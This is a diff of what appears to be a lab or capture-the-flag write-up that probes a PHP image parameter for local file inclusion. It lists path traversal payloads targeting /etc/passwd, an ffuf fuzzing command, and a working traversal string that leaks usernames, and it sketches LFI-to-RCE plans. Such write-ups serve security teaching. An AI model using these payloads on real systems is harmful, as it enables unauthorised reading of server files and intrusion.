@@ -19,17 +19,53 @@ As found previously, the `profile.png` is present in the `/uploads` directory. T
 
 Possible path: `/var/www/html/uploads/profile.png`.
 
-#### Simple path traversal payloads
+### Simple payloads
 
-With knowledge of the current directory, I started off with simple file traversal payloads.
+With knowledge of the current directory, I started off with simple payloads:
+
+1. Path traversal
+   * `../../../../etc/passwd`
+   * `%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`  (URL encoded)
+   * `..//..//..//..//etc/passwd`
+   * `%2E%2E%2F%2F%2E%2E%2F%2F%2E%2E%2F%2F%2E%2E%2F%2Fetc%2Fpasswd` (URL encoded)
+2. Remote public resource
+   * [https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAx6camOf\_G96Zcs2Zj34Yjmy0ysPd-p0oJQ\&s](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAx6camOf_G96Zcs2Zj34Yjmy0ysPd-p0oJQ\&s)
 
 
 
-#### Additional LFI exploitation techniques
+### Brute force discovery
+
+I performed a brute force attack using `ffuf`, with the [wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/JHADDIX_LFI.txt):
+
+* Cookie: `-H "Cookie: PHPSESSID=xxxx"`&#x20;
+* Filter out empty responses: `--fs 0`
+
+```sh
+$ ffuf -w /<wordlist> -u http://<target>:50000/profile.php?img=FUZZ -H "Cookie: PHPSESSID=xxxx" --fs 0
+```
+
+The payload: `....//....//....//....//....//....//....//....//....//etc/passwd` was found to work:
+
+<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+This provides us the following information:
+
+1. Usernames:
+   * `joshua`, `charles`
+2. More importantly, the server is vulnerable to a Local File Inclusion (LFI) vulnerability!
+
+### Exploring methods of exploitation
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md" %}
 
-#### Brute force discovery
+Following the guide in the link above, I explored a few methods to gain RCE on the system.
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/JHADDIX_LFI.txt" %}
+#### 1. SMTP (port 25)
 
+#### 2. SSH (port 22)
+
+#### Interesting discovery
+
+With the `img` payload value of `#` (`/profile.php?img=#`), we are presented with a status **400** response:
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
